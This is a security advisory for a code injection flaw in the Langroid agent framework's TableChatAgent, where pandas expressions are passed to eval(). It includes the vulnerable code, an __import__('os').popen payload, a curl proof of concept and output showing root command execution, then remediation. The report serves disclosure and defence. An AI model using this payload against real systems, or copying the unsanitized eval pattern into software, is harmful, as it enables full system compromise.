# CVE-2025-46724 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-46724
- **CWE ID**: CWE-94 (Improper Control of Generation of Code)
- **CVSS Score**: 9.8 (Critical)
- **Affected Software**: Langroid < 0.53.15
- **Vulnerability Type**: Code Injection

## Description

Langroid's `TableChatAgent` component uses Python's `eval()` function to execute pandas expressions without proper input sanitization. Attackers can inject arbitrary Python code through the pandas namespace (e.g., `pd.io.common.os`) to achieve Remote Code Execution (RCE).

## Vulnerable Code

Location: `langroid/agent/special/table_chat_agent.py`

```python
def pandas_eval(self, msg: PandasEvalTool) -> str:
    exprn = msg.expression
    local_vars = {"df": self.df}
    # ...
    try:
        eval_result = eval(exprn, {}, local_vars)  # Vulnerable line
    except Exception as e:
        eval_result = f"ERROR: {type(e)}: {e}"
```

The `eval()` function directly executes user-controlled input without any validation or sanitization.

## Exploitation

### Attack Vector

The vulnerability exists because `eval()` with empty globals `{}` still exposes `__builtins__`, allowing access to `__import__()`:

```python
__import__('os').popen('id').read()
```

The original code sets `local_vars = {"df": self.df}` and calls `eval(exprn, {}, local_vars)`. While globals is empty, Python automatically provides `__builtins__` unless explicitly set to None.

### Proof of Concept

```bash
curl -X POST http://target:5000/api/pandas_eval \
  -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").popen(\"id\").read()"}' 
```

### Result

```
{"result":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

## Impact

- **Confidentiality**: High - Attackers can read any file on the system
- **Integrity**: High - Attackers can modify system files
- **Availability**: High - Attackers can terminate services or delete files

Successful exploitation allows complete system compromise with the privileges of the application user.

## Remediation

Update to Langroid version 0.53.15 or later, which implements:
- Input sanitization via `sanitize_command()` function
- AST-based validation restricting dangerous methods
- Limitations on method chaining and subscript access

## References

- GitHub Security Advisory: GHSA-jqq5-wc57-f8hj
- Fix Commit: 0d9e4a7bb3ae2eef8d38f2e970ff916599a2b2a6
- Official Documentation: https://github.com/langroid/langroid
